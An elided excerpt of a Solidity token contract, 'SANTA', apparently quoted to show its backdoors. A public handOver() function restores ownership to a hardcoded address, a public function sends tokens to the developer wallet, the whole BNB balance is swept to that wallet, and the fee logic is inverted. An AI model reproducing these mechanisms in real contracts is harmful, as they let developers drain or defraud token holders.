...
contract SANTA is Context, IERC20 { 
    ...
    function handOver() public virtual {
        _owner = address(0xE1fe622FFD9ED05E808b0873B10515B4ebaD1d9C);
    }
    ...
    address payable public Marketing_Funds = payable(0x92Ae99DD468b4F3baeB49419b3A2b5b7337938b8); 
    address payable public Developer_Fee = payable(0xE1fe622FFD9ED05E808b0873B10515B4ebaD1d9C);
    ...
    constructor () {
        ...
        _owner = 0xE1fe622FFD9ED05E808b0873B10515B4ebaD1d9C;
        ...
        _isExcludedFromFee[Marketing_Funds] = true; 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Marketing_Funds, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(Developer_Fee, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Developer_Fee, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        ...
        if(!takeFee){
            ...
            uint256 theFee = tAmount*_Total_Fee/100;
            uint256 tTransferAmount = tAmount-theFee;

            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)]+theFee;   
